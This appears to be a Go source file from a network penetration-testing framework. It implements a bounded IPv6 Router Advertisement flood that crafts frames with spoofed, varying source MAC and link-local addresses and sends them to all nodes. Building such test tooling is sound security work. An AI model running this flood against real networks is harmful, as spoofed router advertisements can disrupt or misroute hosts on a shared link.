// raflood.go implements the RA-flood attack superset.
//
// Durability (from the catalog): transient-decay. The attack sends a
// bounded burst of Router Advertisements with varying source. The
// behavior is bounded by duration and exits on schedule, reporting
// frame counts.
//
// This is a flood-class behavior: it uses the sync.Pool craft path
// for pre-serialized buffers.
//
// Spec-authored — the baseline has no craft for this attack.

package ip6

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type raFloodFinding struct {
	Action     string `json:"action"`
	FrameCount int    `json:"frame_count"`
	Bounded    bool   `json:"bounded"`
}

// RunRAFlood sends a bounded burst of Router Advertisements with varying
// source. The burst is bounded by a fixed frame count for the in-memory
// test shape; the behavior exits on schedule and reports frame counts.
func RunRAFlood(ctx context.Context, deps runner.Deps) error {
	frameCount := 5

	for i := 1; i <= frameCount; i++ {
		pkt, err := craftRAFloodFrame(i)
		if err != nil {
			return fmt.Errorf("raflood: craft frame %d: %w", i, err)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("raflood: send frame %d: %w", i, err)
		}
		if err := ctx.Err(); err != nil {
			return err
		}
	}

	detail, _ := json.Marshal(raFloodFinding{
		Action:     "ra-flood",
		FrameCount: frameCount,
		Bounded:    true,
	})
	deps.Emitter.Finding("ra", detail)

	return nil
}

// craftRAFloodFrame builds a Router Advertisement with a unique source
// MAC and derived link-local. Uses the pool craft path.
func craftRAFloodFrame(seq int) ([]byte, error) {
	floodSrc := net.HardwareAddr{
		0x00, 0x11, 0x22, 0x33,
		byte((seq >> 8) & 0xFF),
		byte(seq & 0xFF),
	}
	linkLocal := make(net.IP, 16)
	linkLocal[0] = 0xfe
	linkLocal[1] = 0x80
	linkLocal[8] = floodSrc[0] ^ 0x02 // EUI-64 U/L bit
	linkLocal[9] = floodSrc[1]
	linkLocal[10] = floodSrc[2]
	linkLocal[11] = 0xff
	linkLocal[12] = 0xfe
	linkLocal[13] = floodSrc[3]
	linkLocal[14] = floodSrc[4]
	linkLocal[15] = floodSrc[5]

	eth := &layers.Ethernet{
		DstMAC:       allNodesMAC,
		SrcMAC:       floodSrc,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      linkLocal,
		DstIP:      allNodesIPv6,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeRouterAdvertisement, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	ra := &layers.ICMPv6RouterAdvertisement{
		HopLimit:       64,
		Flags:          0,
		RouterLifetime: 300,
		ReachableTime:  0,
		RetransTimer:   0,
	}
	return craftPool(eth, ip, icmp, ra)
}

var _ gopacket.SerializableLayer = (*layers.ICMPv6RouterAdvertisement)(nil)
